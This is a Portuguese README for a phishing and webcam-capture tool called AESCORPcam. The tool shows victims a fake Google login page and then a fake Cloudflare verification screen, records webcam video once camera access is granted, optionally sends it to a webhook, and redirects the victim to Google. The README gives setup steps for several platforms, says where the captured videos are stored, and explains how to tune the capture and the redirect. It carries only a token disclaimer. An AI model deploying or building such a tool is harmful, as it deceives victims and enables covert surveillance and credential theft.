# 📹 AESCORPcam

> Ferramenta de captura automática de vídeo para verificação de identidade

![Versão](https://img.shields.io/badge/versão-1.0.0-blue)
![Licença](https://img.shields.io/badge/licença-MIT-green)
![Plataformas](https://img.shields.io/badge/plataformas-Windows%20%7C%20Linux%20%7C%20Android%20(Termux)%20%7C%20Replit-orange)

## 📝 Descrição

AESCORPcam é uma ferramenta que simula um sistema de verificação de segurança do tipo Cloudflare, capturando vídeo da webcam do usuário quando ele permite acesso à câmera. O vídeo é armazenado localmente e pode opcionalmente ser enviado para um webhook externo.

### ✨ Características

- 🎭 Interface idêntica ao verificador de segurança Cloudflare
- 🎬 Captura de vídeo automática (5 segundos por padrão)
- 💾 Armazenamento local dos vídeos capturados
- 🔄 Redirecionamento automático após a verificação
- 🌐 Compatível com múltiplas plataformas

## ⚙️ Requisitos

- Node.js (v12 ou superior)
- NPM ou Yarn
- Conexão com internet
- Navegador moderno com suporte a WebRTC

## 🚀 Instalação

### Windows

```bash
# 1. Clone o repositório
git clone https://github.com/seu-usuario/AESCORPcam.git

# 2. Entre na pasta do projeto
cd AESCORPcam

# 3. Instale as dependências
npm install

# 4. Inicie o servidor
npm start
```

Se você estiver usando o PowerShell e encontrar problemas de permissão:

```powershell
# Execute o PowerShell como administrador
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser

# Ou use o cmd para executar
cmd /c "npm install && npm start"
```

### Linux

```bash
# Instale o Node.js
sudo apt update
sudo apt install nodejs npm

# Clone o repositório e instale
git clone https://github.com/seu-usuario/AESCORPcam.git
cd AESCORPcam
npm install
npm start
```

### Termux (Android)

```bash
# Instale as dependências necessárias
pkg update
pkg install nodejs git

# Clone o repositório
git clone https://github.com/seu-usuario/AESCORPcam.git
cd AESCORPcam

# Configure o armazenamento (opcional)
termux-setup-storage

# Instale e execute
npm install
npm start
```

### Replit

1. Acesse [replit.com](https://replit.com/) e faça login
2. Clique em "Create Repl" e escolha "Import from GitHub"
3. Cole a URL do repositório AESCORPcam
4. Clique em "Import from GitHub"
5. Pressione o botão "Run" para iniciar o servidor

Alternativa manual:
1. Crie um novo Repl com o template Node.js
2. Faça upload dos arquivos do projeto para o Replit
3. Clique em "Run" para iniciar

## ⚡ Uso

1. Execute o servidor: `npm start`
2. Acesse a URL mostrada no terminal (ex: `http://localhost:3000` ou a URL do Replit)
3. Você verá uma tela de login do Google falsa
4. Insira qualquer informação nos campos e clique em "Próximo"
5. Aparecerá uma tela de verificação estilo Cloudflare
6. Quando o usuário permitir acesso à câmera, o vídeo será capturado automaticamente
7. Após a captura, o usuário será redirecionado para o Google

## 📁 Onde os vídeos são salvos?

### Local (Windows/Linux/Mac)

Os vídeos são salvos na pasta:
```
[pasta-do-projeto]/server/uploads/[data-atual]/[timestamp]_video.webm
```

Exemplo: 
```
AESCORPcam/server/uploads/2025-05-20/2025-05-20_10-45-30_video.webm
```

### Replit

No Replit, os vídeos são armazenados na mesma estrutura:
```
server/uploads/[data-atual]/[timestamp]_video.webm
```

Você pode acessá-los pelo navegador de arquivos do Replit. **Importante:** O Replit tem armazenamento efêmero, então os arquivos podem ser perdidos quando o Repl ficar inativo por muito tempo.

## ⚠️ Notas importantes

- Este projeto é apenas para fins educacionais e de demonstração
- Use responsavelmente e apenas com consentimento explícito
- O uso indevido deste código pode violar leis de privacidade e termos de serviço

## 🔧 Resolução de problemas

- **Câmera não inicia**: Verifique as permissões do navegador
- **Erros no Replit**: Certifique-se de que o navegador permite acesso à câmera por HTTPS
- **Arquivos não salvos**: Verifique as permissões da pasta de uploads

## 🔮 Personalização

### Duração do vídeo

Edite o arquivo `.env` e altere o valor de `DURACAO_VIDEO` (tempo em milissegundos):

```
DURACAO_VIDEO=10000  # 10 segundos
```

### URL de redirecionamento

Para alterar para onde o usuário é redirecionado após a verificação, edite a linha no arquivo `public/js/script.js`:

```javascript
window.location.href = "https://accounts.google.com";
```

## 👨‍💻 Contribuidores

<table>
  <tr>
    <td align="center">
      <a href="https://github.com/akilacorp">
        <img src="https://avatars.githubusercontent.com/u/96852651?s=96&v=4" width="100px;" alt="Akila"/><br />
        <sub><b>Akila</b></sub>
      </a>
    </td>
  </tr>
</table>

## 🔗 Links e créditos

- [Canal AESCORP no WhatsApp](https://whatsapp.com/channel/0029VbB1a77545ussjB7uu1s)
- Desenvolvido por Akila
- Logo e conceito por AESCORP

<div align="center">
  <sub>Feito com ☕ e código por AESCORP e Akila.</sub>
</div>
